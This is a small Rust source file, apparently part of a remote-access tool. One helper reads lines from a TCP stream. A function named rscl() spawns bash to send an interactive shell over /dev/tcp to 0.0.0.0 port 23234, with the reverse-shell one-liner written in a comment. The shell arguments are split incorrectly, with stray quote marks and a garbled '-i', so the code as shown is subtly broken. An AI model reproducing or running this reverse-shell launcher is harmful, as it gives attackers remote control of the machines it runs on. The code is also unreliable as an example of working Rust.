use std::io::{BufRead, BufReader, Error, ErrorKind};
use std::net::TcpStream;
use std::process::{Command, ExitStatus};
use std::str::from_utf8;

pub fn reader(stream: &TcpStream) -> Result<String, Error> {
    let mut msg: BufReader<&TcpStream> = BufReader::new(&stream);
    let mut buffer: Vec<u8> = Vec::new();
    msg.read_until(b'\n', &mut buffer)?;
    let output: &str = match from_utf8(&buffer) {
        Ok(it) => it,
        Err(err) => {
            return Err(Error::new(
                ErrorKind::InvalidData,
                format!("Buffer invalid: {}", err),
            ))
        }
    };
    Ok(output.to_string())
}

pub fn rscl() -> Result<ExitStatus, Error> {
    // bash -c '-i >& /dev/tcp/0.0.0.0/23234'
    Command::new("bash")
        .arg("-c")
        .arg("'-i")
        .arg(">&")
        .arg("/dev/tcp/0.0.0.0/23234'")
        .status()
}
